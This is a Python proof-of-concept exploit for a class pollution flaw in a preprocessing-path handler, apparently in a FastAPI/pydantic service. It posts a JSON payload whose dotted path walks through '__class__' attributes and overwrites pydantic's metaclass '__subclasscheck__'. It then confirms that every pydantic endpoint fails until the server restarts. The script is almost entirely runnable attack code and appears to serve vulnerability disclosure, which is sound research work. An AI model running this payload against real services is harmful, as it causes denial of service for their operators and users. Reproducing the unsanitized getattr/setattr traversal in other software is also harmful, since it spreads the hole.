# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: MultiModalDataset.__getitem__
# Type: get-attr-set-attr
# Trigger: HTTP request with malicious preprocessing path
#
# The MultiModalDataset.__getitem__ method splits preprocessing field paths
# on "." and traverses via getattr/setattr without sanitization.
# By specifying a path like "thesis.__class__.__class__.__subclasscheck__",
# the attacker overwrites ModelMetaclass.__subclasscheck__, causing all
# subsequent pydantic model operations (i.e. every FastAPI request) to crash.

import requests
import json
import sys

TARGET_URL = "http://localhost:8080"


def run_poc():
    print("[*] Step 1: Sending normal request (should succeed)...")
    normal_payload = {
        "student": {
            "thesis": {
                "title": {
                    "text": "5"
                }
            }
        },
        "preprocessing_paths": {
            "thesis.title.text": ["prepend_number"]
        }
    }
    resp = requests.post(f"{TARGET_URL}/process_thesis/", json=normal_payload)
    print(f"    Response: HTTP {resp.status_code}")
    if resp.status_code == 200:
        print(f"    Body: {resp.json()}")
        print(f"    [+] Normal request succeeded")
    else:
        print(f"    [-] Unexpected failure: {resp.text[:200]}")
        sys.exit(1)

    print()
    print("[*] Step 2: Sending class pollution payload...")
    print("    Path: thesis.__class__.__class__.__subclasscheck__")
    print("    Effect: overwrites ModelMetaclass.__subclasscheck__ with prepend_number()")
    pollution_payload = {
        "student": {
            "thesis": {
                "title": {
                    "text": "5"
                }
            }
        },
        "preprocessing_paths": {
            "thesis.__class__.__class__.__subclasscheck__": ["prepend_number"]
        }
    }
    resp = requests.post(f"{TARGET_URL}/process_thesis/", json=pollution_payload)
    print(f"    Response: HTTP {resp.status_code}")
    if resp.status_code == 500:
        print(f"    [+] Server error - pollution took effect during this request!")
    else:
        print(f"    [+] Payload delivered (HTTP {resp.status_code})")

    print()
    print("[*] Step 3: Sending normal request again (should fail - DoS)...")
    resp = requests.post(f"{TARGET_URL}/process_thesis/", json=normal_payload)
    print(f"    Response: HTTP {resp.status_code}")
    if resp.status_code == 500:
        print(f"    [+] DoS confirmed! All pydantic-based endpoints are broken")
        print(f"    Error: {resp.text[:200]}")
    else:
        print(f"    [-] Request unexpectedly succeeded (HTTP {resp.status_code})")

    print()
    print("[*] Gadget chain:")
    print("    preprocessing_paths -> MultiModalDataset.__getitem__")
    print("    -> getattr traversal: thesis.__class__.__class__.__subclasscheck__")
    print("    -> setattr overwrites ModelMetaclass.__subclasscheck__")
    print("    -> issubclass() broken for all pydantic models -> DoS")
    print()
    print("[!] Impact: Denial of Service")
    print("    Every FastAPI endpoint using pydantic models is now broken")
    print("    until the server process restarts.")


if __name__ == "__main__":
    run_poc()
